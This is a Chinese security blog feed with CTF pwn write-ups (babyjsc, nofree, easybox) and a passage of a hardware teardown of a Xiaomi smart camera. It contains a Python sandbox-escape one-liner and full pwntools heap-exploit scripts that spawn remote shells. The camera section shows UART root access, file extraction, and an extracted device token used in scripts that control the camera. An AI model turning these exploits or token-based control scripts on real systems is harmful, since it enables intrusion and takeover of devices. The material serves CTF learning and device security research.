    <content type="html"><![CDATA[<h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><p>题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为server.py<br>然后把下载下来的文件解压，搜索server.py ，查看可知</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978442882.png" class="lozad"><br>python input()的时候沙箱逃逸，直接<strong>import</strong>(‘os’).system(“cat /home/ctf/flag”) ,获取到flag</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978742005.png" class="lozad"></p><h2 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h2><p>申请堆块的时候是用strdup来申请的，strdup是根据输入的字符串长度来申请堆块的，若add(0,0x90,‘aaaa’)，edit的时候则造成溢出。<br>此题没有free功能，利用house of orange 攻击 造成一个free过后的堆块，然后伪造size，通过溢出修改 free过后堆块的fd为chunklist附近区域，然后fastbin attack 申请堆块到chunklist，控制堆块指针，修改chunklist[1]为strdup函数的got表，edit功能修改strdup的got表为printf_got,再利用格式化字符串漏洞泄露libc_addr，最后再次修改strdup_got为system_got,然后申请”/bin/sh”的堆块，即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"pwn"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'101.200.53.148'</span>,<span class="number">12301</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------house of orange-------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x1e</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x70</span>,chr(i)*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x81</span>,chr(<span class="number">0x20</span>)*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x71</span>,chr(<span class="number">0x21</span>)*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,chr(<span class="number">0x22</span>)*<span class="number">0x90</span>) <span class="comment"># fastbin </span></span><br><span class="line"><span class="comment">#----------fastbin attack-----------</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x20</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602128</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x23</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x24</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------chunklist attack---------</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"e"</span>*<span class="number">0x88</span>+p64(<span class="number">0x6021c0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602068</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">"printf"</span>]))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"%17$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-240</span>-libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">info(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">info(<span class="string">"sys_addr"</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597995302847.png" class="lozad"></p><h2 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h2><p>off-by-one漏洞，没有show功能，老套路了，布局堆块，溢出修改下一个堆块的size包含多个堆块，然后free，根据unsorted bin的特性使得fastbin里面有残留的main_area地址然后修改后两位字节，有十六分之一的几率为 stdout_addr-0x43，然后fastbin_attack 打_IO_2_1_stdout_,修改io_flags为0xfbad1887即可泄露出libc_addr,再次fastbin_attack 打malloc_hook为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">"101.200.53.148"</span>, <span class="number">34521</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:\n'</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'len:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span>,<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf0</span>,<span class="string">'f'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'aaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x88'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">malloc_hook  = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base + <span class="number">0x3c54fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"\x41"</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">'\x42'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'\x43'</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"0"</span>*<span class="number">0x28</span>+<span class="string">'\xe1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xa0</span>,<span class="string">"3"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"><span class="comment">#add(8,0xa0,"3"*0x68+p64(0x71)+p64(io_list_all))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">"\x44"</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base + one[<span class="number">2</span>]))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your token:"</span>,<span class="string">'icq700049c29f86f68a9b934524cf619'</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;babyjsc&quot;&gt;&lt;a href=&quot;#babyjsc&quot; class=&quot;headerlink&quot; title=&quot;babyjsc&quot;&gt;&lt;/a&gt;babyjsc&lt;/h2&gt;&lt;p&gt;题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为serve
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>米家小白智能摄像头分析</title>
    <link href="https://nocbtm.github.io/2020/07/21/%E7%B1%B3%E5%AE%B6%E5%B0%8F%E7%99%BD%E6%99%BA%E8%83%BD%E6%91%84%E5%83%8F%E5%A4%B4%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/07/21/米家小白智能摄像头分析/</id>
    <published>2020-07-21T11:10:45.000Z</published>
    <updated>2020-09-02T01:40:51.628Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h2><p>拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片</p><p>小米做的是真的好，不太好拆，可参考硬核拆解</p><p><a href="https://www.bilibili.com/video/BV1d4411G7vu?t=64" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1d4411G7vu?t=64</a></p><p><a href="http://www.eepw.com.cn/article/201608/295287.htm" target="_blank" rel="noopener">http://www.eepw.com.cn/article/201608/295287.htm</a></p><p>拆完可以看到，这么大的NOR Flash，一般的编程器提取不了，需要更专业的设备。</p><p><img alt="image-20200807110220255" data-src="https://nocbtm.github.io/imgs/image-20200807110220255.png" class="lozad"></p><p>uart调试口一般都在flash的附近，仔细观看。正面没有，看看反面</p><p>这里有一个坑点，有两个Rx，Tx口。经过测试如下已经焊接上的口是真正的，而另一个接上没反应。</p><p><img alt="image-20200807111406761" data-src="https://nocbtm.github.io/imgs/image-20200807111406761.png" class="lozad"></p><p>用SecureCRT接上，波特率选择115200</p><p><img alt="image-20200807133925437" data-src="https://nocbtm.github.io/imgs/image-20200807133925437.png" class="lozad"></p><p>连上之后，没有做用户认证，直接就进来了。看了下开启的端口，有些怪异的地方</p><p>23端口运行着 linuxrc ，这应该是防止开启telnetd服务吧</p><p>而且没有开启554端口的rtsp服务来传输视频，可能用的别的服务吧</p><p><img alt="image-20200807122344393" data-src="https://nocbtm.github.io/imgs/image-20200807122344393.png" class="lozad"></p><p>百度了一下运行的程序</p><p>其中24883端口的<code>pulseaudio</code>是一个声音服务器，用来传输声音的</p><p>摄像头内网1883端口的<code>mosquitto</code>是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，用来传输监控视频的</p><p>而且他传输视频不像普通摄像头那么简单，我把他进程杀的差不多了，手机还能看到监控视频</p><p>而54321端口运行的是小米的miio协议，可参考<a href="https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md" target="_blank" rel="noopener">https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md</a></p><p><img alt="image-20200807140936533" data-src="https://nocbtm.github.io/imgs/image-20200807140936533.png" class="lozad"></p><p>针对这个端口python已经有攻击的库了，可参考<a href="https://github.com/rytilahti/python-miio，" target="_blank" rel="noopener">https://github.com/rytilahti/python-miio，</a></p><p><img alt="image-20200807142959137" data-src="https://nocbtm.github.io/imgs/image-20200807142959137.png" class="lozad"></p><p><img alt="image-20200807142031135" data-src="https://nocbtm.github.io/imgs/image-20200807142031135.png" class="lozad"></p><p>难受的是现在还不支持小白摄像头，只能自己分析一下了</p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>可以看到我们想要分析的程序在 ./usr/bin/目录下</p><p><img alt="image-20200807144200666" data-src="https://nocbtm.github.io/imgs/image-20200807144200666.png" class="lozad"></p><p>busybox刚好自带httpd服务，默认是不开器的，我们把它打开，用来传输文件</p><p>把 ./usr 目录 和 ./lib 目录都压缩一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd</span><br><span class="line">tar -zcvf usr.tar.gz ./usr</span><br><span class="line">tar -zcvf lib.tar.gz ./lib</span><br></pre></td></tr></table></figure><p>然后wget下来，进行解压  <code>tar -zxvf usr.tar.gz</code></p><p><img alt="image-20200807145210801" data-src="https://nocbtm.github.io/imgs/image-20200807145210801.png" class="lozad"></p><h2 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h2><p>找到了摄像头的初始化脚本，可以看到程序的启动方式<code>/usr/bin/mosquitto -c /etc/mosquitto/mosquitto.conf -d</code></p><p><code>/usr/bin/miio_client -D</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/image-20200807145919673.png" class="lozad"></p><p>使用qemu模拟，先把mosquitt跑起来，再跑 miio_client</p><p><img alt="image-20200807150954939" data-src="https://nocbtm.github.io/imgs/image-20200807150954939.png" class="lozad"></p><p><img alt="image-20200807151142230" data-src="https://nocbtm.github.io/imgs/image-20200807151142230.png" class="lozad"></p><p>然后向54321发送udp数据，可以看到成功接收到</p><p><img alt="image-20200807155050870" data-src="https://nocbtm.github.io/imgs/image-20200807155050870.png" class="lozad"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据一些字符串可以快速定位到代码</p><p><img alt="image-20200807155620286" data-src="https://nocbtm.github.io/imgs/image-20200807155620286.png" class="lozad"></p><p>可以分析出传输的数据是json格式的，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;method&quot;:&quot;get_prop&quot;,&quot;params&quot;:[&quot;night_state&quot;,&quot;night_beg_time&quot;,&quot;night_end_time&quot;]&#125;</span><br></pre></td></tr></table></figure><p>而且需要认证ID</p><p><img alt="image-20200807160052510" data-src="https://nocbtm.github.io/imgs/image-20200807160052510.png" class="lozad"></p><p>可以看到有很多配置<code>method</code></p><p><img alt="image-20200807155838345" data-src="https://nocbtm.github.io/imgs/image-20200807155838345.png" class="lozad"></p><p>进入miIo.config_router方法可以看到接收的数据都是用<code>json_object_object_add</code>函数来匹配接收的，</p><p>代码写的很好，没有发现什么栈溢出漏洞</p><p><img alt="image-20200807163002510" data-src="https://nocbtm.github.io/imgs/image-20200807163002510.png" class="lozad"></p><p>但还是能分析出来一些敏感信息，wifi的连接密码</p><p><img alt="image-20200807165114652" data-src="https://nocbtm.github.io/imgs/image-20200807165114652.png" class="lozad"></p><p>miio的配置文件</p><p><img alt="image-20200807164907414" data-src="https://nocbtm.github.io/imgs/image-20200807164907414.png" class="lozad"></p><p>miio的验证token</p><p><img alt="image-20200807165257875" data-src="https://nocbtm.github.io/imgs/image-20200807165257875.png" class="lozad"></p><p>通过这个token就可以控制摄像头，先安装python-miio方便利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-miio</span><br></pre></td></tr></table></figure><p>目前这个库还不支持这款摄像头，需要自己再改写一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> protocol <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line">helobytes=bytes.fromhex(<span class="string">'21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(helobytes,(<span class="string">'192.168.137.159'</span>,<span class="number">54321</span>))<span class="comment">#插座ip，端口54321</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">m=Message.parse(data)</span><br><span class="line">tok=codecs.encode(m.checksum,<span class="string">'hex'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(tok)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> miio</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">s = miio.device.Device(ip=ip, token=token)</span><br><span class="line">s.info()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">from</span> miio.chuangmi_plug <span class="keyword">import</span> ChuangmiPlug</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">d = ChuangmiPlug(ip=ip, token=token)</span><br><span class="line"></span><br><span class="line">x=d.status() <span class="comment"># 给出设备的状态</span></span><br><span class="line"><span class="comment"># x: &lt;ChuangmiPlugStatus power=True, usb_power=None, temperature=46, load_power=None, wifi_led=None&gt;</span></span><br><span class="line"><span class="comment"># x.power = True</span></span><br><span class="line">x=d.info()</span><br><span class="line"><span class="comment"># type(z)</span></span><br><span class="line"><span class="comment"># miio.device.DeviceInfo</span></span><br><span class="line"><span class="comment"># print(z)</span></span><br><span class="line"><span class="comment"># chuangmi.plug.m3 v1.3.8_0002 (04:CF:8C:5F:**:**) @ 192.168.1.20 - token: *****</span></span><br><span class="line">x=d.off()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br><span class="line">x=d.on()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" 